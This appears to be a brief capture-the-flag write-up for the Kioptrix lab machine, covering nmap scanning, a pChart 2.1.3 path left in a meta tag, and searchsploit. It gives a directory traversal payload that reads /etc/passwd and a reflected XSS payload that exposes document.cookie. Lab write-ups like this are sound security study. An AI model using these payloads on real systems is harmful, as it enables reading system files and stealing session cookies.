## Find IP of box
Our IP: x.x.x.49

`nmap -sP <LHOST>/24`

Kioptrix is running x.x.x.16

## Init NMap Scan

`nmap -sC -sV -oA nmap x.x.x.16`

 - Default Scripts
 - Service Detection
 - Output all formats

 There are 3 ports open: 22 (ssh), 80 (http), 8080 (http)
 
 However, the ssh port is closed so we cannot connect
  
 ## HTTP
 
 If we check the source code of port 80, the meta tag has been left in and gives us a url path: pChart2.1.3/index.php
 
 ### Searchsploit
 
 `searchsploit pchart 2.1.3` and we get a txt file containing explanations of multiple explanations such as directory traversal and XSS
 
 ### Directory Traversal
 
Append `?Action=View&Script=/../../etc/passwd` to the url (after index.php) to view etc/passwd but no hashes to be cracked

### XSS

`?id=<script>alert(document.cookie)</script>`
